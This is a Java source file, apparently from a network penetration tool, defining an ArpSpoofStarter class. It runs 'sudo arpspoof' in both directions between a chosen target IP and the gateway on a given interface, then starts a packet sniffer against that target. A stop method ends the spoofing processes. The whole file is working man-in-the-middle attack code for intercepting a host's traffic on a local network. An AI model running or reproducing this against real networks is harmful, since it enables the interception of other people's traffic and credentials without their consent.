package org.npt.beans.implementation;

import lombok.extern.slf4j.Slf4j;

import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

import static org.npt.configuration.Configuration.logStorageFolder;

@Slf4j
public class ArpSpoofStarter {

    private static final String COMMAND = "sudo arpspoof -i %s -t %s %s";
    private static final String PROCESS_NAME = "Spoofing the following Target : %s , Gateway : %s";
    private static final List<ProcessExecuter> processExecuters = new ArrayList<>();

    public void stopSpoofing(String targetIp, String gatewayIp) {
        final String processName = ProcessExecuter.ProcessUtils.generateProcessNameFrom(String.format(PROCESS_NAME, targetIp, gatewayIp));
        final List<ProcessExecuter> filteredProcessExecuter = processExecuters.stream().filter(processExecuter -> processExecuter.getProcessName().equals(processName))
                .collect(Collectors.toCollection(ArrayList::new));
        filteredProcessExecuter.forEach(processExecuter -> {
            processExecuter.stop();
            processExecuters.remove(processExecuter);
        });
    }

    public void startSpoofing(String scanInterface, String targetIp, String gatewayIp) {
        final String commandFirst = String.format(COMMAND, scanInterface, targetIp, gatewayIp);
        final String commandSecond = String.format(COMMAND, scanInterface, gatewayIp, targetIp);
        String processName = String.format(PROCESS_NAME, targetIp, gatewayIp);
        processName = ProcessExecuter.ProcessUtils.generateProcessNameFrom(processName);
        final ProcessExecuter normal = ProcessExecuter.execute(processName, logStorageFolder, new String[]{commandFirst}, false);
        final ProcessExecuter reverse = ProcessExecuter.execute(processName, logStorageFolder, new String[]{commandSecond}, false);
        processExecuters.add(normal);
        processExecuters.add(reverse);
        PacketSniffer packetSniffer = new PacketSniffer(targetIp);
        packetSniffer.startSniffing();
    }


}
